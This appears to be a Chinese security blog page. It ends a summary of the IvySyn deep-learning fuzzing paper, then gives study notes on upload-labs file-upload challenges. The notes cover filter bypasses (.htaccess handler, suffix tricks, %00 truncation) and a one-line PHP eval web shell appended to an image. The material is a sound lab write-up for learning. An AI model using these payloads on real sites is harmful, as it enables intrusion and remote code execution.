<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>本位设计并实现了IvySyn，IvySyn首先识别DL内核代码实现，并添加模糊钩子，以便对类型感知突变执行基于突变的模糊。 接下来，给定一组崩溃的内核，它合成了传播违规输入的高级代码片段，这些代码片段会使本机内核崩溃，认为是高级API。此类代码片段可以作为漏洞的证明，并可以帮助开发人员复制、分析并最终修复各自的错误。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/08/Paper-IvySyn%20Automated%20Vulnerability%20Discovery%20in%20Deep%20Learning%20Frameworks/" data-id="clscsnyfv0000vcvferw4ai99" data-title="IvySyn" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web-File2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/07/Web-File2/" class="article-date">
  <time class="dt-published" datetime="2024-02-07T10:25:47.000Z" itemprop="datePublished">2024-02-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/07/Web-File2/">Web-File2</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h5 id="Pass-03（黑名单绕过）"><a href="#Pass-03（黑名单绕过）" class="headerlink" title="Pass-03（黑名单绕过）"></a>Pass-03（黑名单绕过）</h5><p>trim函数 如果有空格，就把空格删除</p>
<p>这道题黑名单中有php，将文件后缀改为php5或phtml即可绕过</p>
<h5 id="Pass-04（黑名单绕过-htaccess攻击）。。。"><a href="#Pass-04（黑名单绕过-htaccess攻击）。。。" class="headerlink" title="Pass-04（黑名单绕过 .htaccess攻击）。。。"></a>Pass-04（黑名单绕过 .htaccess攻击）。。。</h5><p>上传.htaccess文件</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shana&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>文件名包含shana的会被当做php执行</p>
<p>可以把php文件命名为jpg文件，绕过黑名单，在网页访问该文件时，该文件会以php执行</p>
<h5 id="Pass-05（黑名单绕过-后缀双写逻辑绕过）"><a href="#Pass-05（黑名单绕过-后缀双写逻辑绕过）" class="headerlink" title="Pass-05（黑名单绕过 后缀双写逻辑绕过）"></a>Pass-05（黑名单绕过 后缀双写逻辑绕过）</h5><p>查看源码，黑名单有大小写，但是没有所有的大小写组合，并且后缀名会转为小写，用双写绕过</p>
<p>后缀名改为.phpphp，上传成功</p>
<h5 id="Pass-06（黑名单绕过-大小写文件名混淆）"><a href="#Pass-06（黑名单绕过-大小写文件名混淆）" class="headerlink" title="Pass-06（黑名单绕过 大小写文件名混淆）"></a>Pass-06（黑名单绕过 大小写文件名混淆）</h5><p>查看源码，黑名单有大小写，但是没有所有的大小写组合，并且后缀名不会统一转为小写，将文件后缀改成PHp（黑名单中没有），上传成功</p>
<h5 id="Pass-07（黑名单绕过-空格绕过）。。。"><a href="#Pass-07（黑名单绕过-空格绕过）。。。" class="headerlink" title="Pass-07（黑名单绕过 空格绕过）。。。"></a>Pass-07（黑名单绕过 空格绕过）。。。</h5><p>查看源码，发现跟之前源码相比，少了首位去空，抓包，在文件名最后加个空格，再forward，就上传成功</p>
<h5 id="Pass-08（黑名单绕过-填点绕过）。。。"><a href="#Pass-08（黑名单绕过-填点绕过）。。。" class="headerlink" title="Pass-08（黑名单绕过 填点绕过）。。。"></a>Pass-08（黑名单绕过 填点绕过）。。。</h5><p>查看源码，发现没有删除文件名末尾的点，抓包，在后面加个.，绕过</p>
<h5 id="Pass-09（黑名单绕过-Win文件流特性绕过）"><a href="#Pass-09（黑名单绕过-Win文件流特性绕过）" class="headerlink" title="Pass-09（黑名单绕过 Win文件流特性绕过）"></a>Pass-09（黑名单绕过 Win文件流特性绕过）</h5><p>查看源码，没有去除字符串::$DATA，抓包，在最后加上::$DATA，上传成功</p>
<h5 id="Pass-10（黑名单绕过-点空格点代码逻辑绕过）。。。"><a href="#Pass-10（黑名单绕过-点空格点代码逻辑绕过）。。。" class="headerlink" title="Pass-10（黑名单绕过 点空格点代码逻辑绕过）。。。"></a>Pass-10（黑名单绕过 点空格点代码逻辑绕过）。。。</h5><p>抓包，将文件名后缀改为.php.  .</p>
<p>首先去除空格，删除最后一个.</p>
<p>然后后缀名为.php.，绕过过滤，上传成功</p>
<h5 id="Pass-11（黑名单绕过-双写绕过）"><a href="#Pass-11（黑名单绕过-双写绕过）" class="headerlink" title="Pass-11（黑名单绕过 双写绕过）"></a>Pass-11（黑名单绕过 双写绕过）</h5><p>有一次过滤，将后缀名改为.pphphp，过滤完后缀名为.php，上传成功</p>
<h5 id="Pass-12（白名单绕过-00截断GET型绕过）"><a href="#Pass-12（白名单绕过-00截断GET型绕过）" class="headerlink" title="Pass-12（白名单绕过 00截断GET型绕过）"></a>Pass-12（白名单绕过 00截断GET型绕过）</h5><p>这段代码是防止多个点绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>白名单加防止多点绕过，需要用到%00截断，%00是在地址方面，0x00截断是在文件命名方面</p>
<p>例如文件名为1.php</p>
<p>只能上传.jpg后缀文件，代码将文件命名为 1.php.19283018.jpg，使其为一个jpg文件</p>
<p>如果加上%00截断，1.php%00.19283018.jpg，%00之后的就没有了，为1.php</p>
<p>抓包，在第一行的参数save_path&#x3D;..&#x2F;upload&#x2F;改为save_path&#x3D;..&#x2F;upload&#x2F;1.php%00，php版本换为5.2</p>
<p>第21天 1:32:03</p>
<h5 id="Pass-13（白名单绕过-00截断POST型绕过）"><a href="#Pass-13（白名单绕过-00截断POST型绕过）" class="headerlink" title="Pass-13（白名单绕过 00截断POST型绕过）"></a>Pass-13（白名单绕过 00截断POST型绕过）</h5><p>跟Pass-12类似，抓包，找到..&#x2F;upload的位置，写成..&#x2F;upload&#x2F;xx.php%00</p>
<p>但是这个%00需要编码，选中%00，右键</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/faf6e2ef-ac59-4ee8-9d1f-7c48fedde799" alt="image"></p>
<h5 id="Pass-14（图片马-文件包含绕过）。。。"><a href="#Pass-14（图片马-文件包含绕过）。。。" class="headerlink" title="Pass-14（图片马+文件包含绕过）。。。"></a>Pass-14（图片马+文件包含绕过）。。。</h5><p>在图片中写入后门代码</p>
<p>php后门代码，将这个代码附加在图片后面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在cmd中运行copy 1.png &#x2F;b + a.php &#x2F;a webshell.jpg，得到webshell.jpg，可以看到图像最后加上了这一行php代码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/96294650-d853-473e-a855-68f648453a2c" alt="image"></p>
<p>获取上传的图片地址，右键图片，复制图像链接</p>
<p><a target="_blank" rel="noopener" href="http://192.168.182.1/upload/upload/8920230926111805.png">http://192.168.182.1/upload/upload/8920230926111805.png</a></p>
<p>点击题目中给的文件包含漏洞链接，加上参数，进行访问</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/009f3474-9108-4149-b8be-78ee5bb17aeb" alt="image"></p>
<p>再用post传参，x&#x3D;phpinfo();，可以执行php代码</p>
<h4 id="文件上传之后端黑白名单绕过"><a href="#文件上传之后端黑白名单绕过" class="headerlink" title="文件上传之后端黑白名单绕过"></a>文件上传之后端黑白名单绕过</h4><p>黑名单：明确不让上传的格式后缀</p>
<p>白名单：明确可以上传的格式后缀</p>
<p>如果黑名单中有PHP，可以用PHP5或Phtml来绕过限制</p>
<p>enctype：文件上传的类型</p>
<p>method：上传方式</p>
<p>onsubmit：鼠标触发事件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7179fdb4-ae78-4825-84f0-e1afdb7e190c" alt="image"></p>
<p>看下面的代码，PHP中接受文件的参数名要与HTML表单中的一致，以name的值发送过去，name的值是upload_file，所以上面也是upload_file</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;error&#x27;] 和该文件上传相关的错误代码。[&#x27;error&#x27;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name=$_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; #接收文件上传</span><br><span class="line">echo $name</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form enctypt=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;p&gt;请选择要上传的图片：&lt;/p&gt;</span><br><span class="line">    &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;</span><br><span class="line">    &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>.htaccess，用apach才行</p>
<p>.htaccess是apach的一个配置文件，将.htaccess文件上传成功后，其余文件会依照.htaccess的执行</p>
<p>.htaccess示例</p>
<p>将这个文件上传成功后，再上传文件名中包含shana的文件，就会被当作x-httpd-php来执行</p>
<p>注意shana文件要和上传的.htaccess文件在同一目录</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shana&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>有的代码是一次过滤，有的是循环过滤</p>
<p>比如说，a.phphp，一次过滤之后为a.php</p>
<p>循环过滤（递归过滤） 过滤后为a.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/07/Web-File2/" data-id="clsaip1bn0000ncvf6hfaa4m1" data-title="Web-File2" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/learn/" rel="tag">learn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 15px;">Fuzzing</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 12.5px;">Web安全</a> <a href="/tags/learn/" style="font-size: 17.5px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 20px;">论文细读</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/02/23/20240223/">20240222</a>
          </li>
        
          <li>
            <a href="/2024/02/22/20240222/">20240222</a>
          </li>
        
          <li>
            <a href="/2024/02/21/20240221/">20240221</a>
          </li>
        
          <li>
            <a href="/2024/02/20/20240220/">20240220</a>
          </li>
        
          <li>
            <a href="/2024/02/18/20240218/">20240218</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>